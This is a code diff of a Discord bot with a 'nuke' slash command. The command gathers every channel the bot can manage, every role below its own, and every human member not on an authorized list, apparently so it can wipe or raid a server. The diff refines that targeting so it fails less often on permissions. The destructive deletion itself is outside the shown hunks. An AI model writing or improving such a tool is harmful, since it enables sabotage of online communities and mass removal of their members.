@@ -19,7 +19,7 @@ if not TOKEN:
     raise RuntimeError("Missing TOKEN environment variable")
 
 # ----------------------
-# FLASK KEEP-ALIVE (Render)
+# FLASK KEEP-ALIVE
 # ----------------------
 app = Flask("")
 
@@ -56,7 +56,7 @@ def progress_bar(done, total, size=20):
     return "▓" * filled + "░" * (size - filled)
 
 # ----------------------
-# STOP VIEW
+# STOP BUTTON VIEW
 # ----------------------
 class StopView(View):
     def __init__(self, user_id):
@@ -193,12 +193,18 @@ async def nuke(interaction: Interaction):
     guild = interaction.guild
     bot_member = guild.me
 
-    channels = list(guild.channels)
+    # Filter only channels the bot can manage
+    channels = [
+        ch for ch in guild.channels
+        if ch.permissions_for(bot_member).manage_channels
+    ]
+
     roles = [
         r for r in guild.roles
         if not r.is_default() and not r.managed
         and r.position < bot_member.top_role.position
     ]
+
     members = [
         m for m in guild.members
         if not m.bot and m.id not in AUTHORIZED_USERS
